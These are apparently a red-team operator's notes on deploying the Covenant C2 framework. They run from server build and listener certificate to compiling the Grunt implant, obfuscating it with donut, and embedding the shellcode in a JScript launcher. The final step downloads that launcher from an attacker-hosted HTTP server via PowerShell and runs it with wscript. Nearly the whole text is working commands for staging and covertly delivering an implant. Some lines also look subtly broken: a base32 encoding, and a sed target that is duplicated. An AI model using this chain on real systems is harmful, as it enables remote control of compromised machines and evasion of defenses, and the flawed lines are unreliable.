#### 1. About

- URL: `https://github.com/cobbr/Covenant`
- .NET C2 framework


#### 2. Build

From: `https://github.com/cobbr/Covenant/wiki/Installation-And-Startup`

```
# git clone --recurse-submodules https://github.com/cobbr/Covenant
# cd Covenant/Covenant
# docker build -t covenant .
```


#### 3. Run

```
# cd Covenant/Covenant
# docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -d -v `pwd`/Data>:/app/Data covenant
```


#### 4. SSL Cert for HTTPs listener

```
# site='test.local'
# out='default.pem'
# openssl req \
-x509 -nodes -days 365 -sha512 \
-subj "/C=CH/ST=ZH/L=Zurich/CN=$site" \
-newkey rsa:4096 -keyout $out -out $out
# openssl pkcs12 -export -in $out -inkey $out -out default.pfx
```

- ConnectAddresses: <EXTERNAL_IP>
- ConnectPort: 443
- BindPort: 443
- BindAddress: 0.0.0.0


#### 5. Instrumentation

1. Launcher config

```
Launchers > Binary (ValidateCert: false, UseCertPinning: false)
Launchers > Binary > Code - save as GruntHTTP.cs
```

2. Compile .NET

```
PS>C:\Windows\Microsoft.Net\Framework64\v4*\csc.exe -out:grunt64.exe GruntHTTP.cs
PS>C:\Windows\Microsoft.Net\Framework64\v4*\csc.exe -platform:x86 -out:grunt32.exe GruntHTTP.cs
```

3. Use `donut` (`https://github.com/TheWover/donut/releases`) for binary obfuscation

```
PS>.\donut.exe -a2 -f1 'grunt64.exe' -o grunt64.bin
PS>.\donut.exe -a2 -f1 'grunt32.exe' -o grunt32.bin
```

4. WScript example

```
PS>powershell -c "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/outflanknl/Scripts/master/ShellcodeToJScript.js')" > x.js
PS>wscript.exe x.js
```

5. Place encoded Grunt shell-code into launcher JS script for `wscript`

```
# wget https://raw.githubusercontent.com/outflanknl/Scripts/master/ShellcodeToJScript.js

# l32=`grep -n '^var encodedPayload32' ShellcodeToJScript.js | awk -F ':' '{print $1}'`
# l64=`grep -n '^var encodedPayload64' ShellcodeToJScript.js | awk -F ':' '{print $1}'`

# p32=`base32 -w0 grunt32.bin`
# p64=`base64 -w0 grunt64.bin`

# sed -i --expression $l32"s@.*@var encodedPayload64=\"$p32\";@" ShellcodeToJScript.js
# sed -i --expression $l64"s@.*@var encodedPayload64=\"$p64\";@" ShellcodeToJScript.js
```

6. Serve/download and run the JS file

```
# python3 -m http.server 9999

>powershell -c "(New-Object System.Net.WebClient).DownloadString('http://172.16.103.128:9999/ShellcodeToJScript.js')" > %temp%\x.js
>wscript.exe %temp%\x.js
```
